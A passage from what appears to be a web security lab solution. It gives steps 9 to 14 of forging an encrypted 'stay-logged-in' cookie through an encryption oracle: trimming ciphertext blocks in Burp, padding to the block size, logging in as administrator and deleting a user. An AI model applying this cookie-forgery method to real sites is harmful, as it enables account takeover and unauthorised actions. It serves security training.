9. In Burp Repeater, switch to the message editor's "Hex" tab. Select the first 23 bytes, then right-click and select "Delete selected bytes".

10. Re-encode the data and copy the result into the `notification` cookie of the decrypt request. When you send the request, observe that an error message indicates that a block-based encryption algorithm is used and that the input length must be a multiple of 16. You need to pad the "`Invalid email address: `" prefix with enough bytes so that the number of bytes you will remove is a multiple of 16.

11. In Burp Repeater, go back to the encrypt request and add 9 characters to the start of the intended cookie value, for example:

    ```
    xxxxxxxxxadministrator:your-timestamp
    ```

    Encrypt this input and use the decrypt request to test that it can be successfully decrypted.

12. Send the new ciphertext to Decoder, then URL and Base64-decode it. This time, delete 32 bytes from the start of the data. Re-encode the data and paste it into the `notification` parameter in the decrypt request. Check the response to confirm that your input was successfully decrypted and, crucially, no longer contains the "`Invalid email address: `" prefix. You should only see `administrator:your-timestamp`.

13. From the proxy history, send the `GET /` request to Burp Repeater. Delete the `session` cookie entirely, and replace the `stay-logged-in` cookie with the ciphertext of your self-made cookie. Send the request. Observe that you are now logged in as the administrator and have access to the admin panel.

14. Using Burp Repeater, browse to `/admin` and notice the option for deleting users. Browse to `/admin/delete?username=carlos` to solve the lab.




